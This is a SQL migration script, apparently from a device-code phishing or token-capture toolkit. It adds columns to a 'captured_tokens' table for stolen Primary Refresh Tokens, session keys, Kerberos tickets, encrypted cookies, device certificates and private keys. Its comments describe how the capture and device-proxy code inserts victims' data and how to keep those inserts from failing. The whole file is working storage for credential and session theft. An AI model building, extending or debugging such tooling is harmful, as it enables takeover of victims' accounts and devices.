-- Migration: guarantee every captured_tokens column the capture code writes.
--
-- WHY THIS EXISTS
-- The device-code / device-proxy INSERTs write columns that come from THREE
-- different sources:
--   * schema.sql                       -> cookies_encrypted, device_id,
--                                         device_certificate_encrypted,
--                                         encrypted_private_key,
--                                         device_enrolled, enrollment_time
--   * add_prt_kerberos_columns.sql     -> prt, session_key_jwe,
--                                         device_tenant_id, tgt_*,
--                                         account_type
--   * add_client_info_column.sql       -> client_info
--   * add_client_id_column.sql         -> client_id
-- If any single one is missing the primary INSERT fails, deviceproxy logs
-- "Device columns missing, falling back to legacy insert", and the row loses
-- the device/PRT data (session_key_jwe included).
--
-- This migration re-asserts ALL of them. It is deliberately idempotent by
-- failure: the runner in server.js splits the file on the semicolon character
-- and wraps every statement in try/catch, so an already-present column raises a
-- harmless "Duplicate column name" that gets discarded.
--
-- NOTE: never write a literal semicolon inside a comment here. The runner
-- splits blindly, so a stray one truncates the next real ALTER statement and
-- the column silently never gets added.
--
-- Do NOT use IF NOT EXISTS (not supported for ADD COLUMN in MySQL 5.7/8.0 in a
-- portable way) and do NOT use PREPARE/EXECUTE (session vars do not survive
-- across statements on the connection pool).

ALTER TABLE captured_tokens ADD COLUMN prt TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN client_info TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN session_key_jwe TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN device_tenant_id VARCHAR(255) NULL;

ALTER TABLE captured_tokens ADD COLUMN cookies_encrypted TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN device_id VARCHAR(128) NULL;

ALTER TABLE captured_tokens ADD COLUMN device_certificate_encrypted TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN encrypted_private_key TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN device_enrolled TINYINT(1) DEFAULT 0;

ALTER TABLE captured_tokens ADD COLUMN enrollment_time DATETIME NULL;

ALTER TABLE captured_tokens ADD COLUMN tgt_ad TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN tgt_cloud TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN kerberos_top_level_names TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN tgt_cloud_sessionkey TEXT NULL;

ALTER TABLE captured_tokens ADD COLUMN account_type ENUM('personal','work_school','unknown') DEFAULT 'unknown';

ALTER TABLE captured_tokens ADD COLUMN client_id VARCHAR(128) NULL;
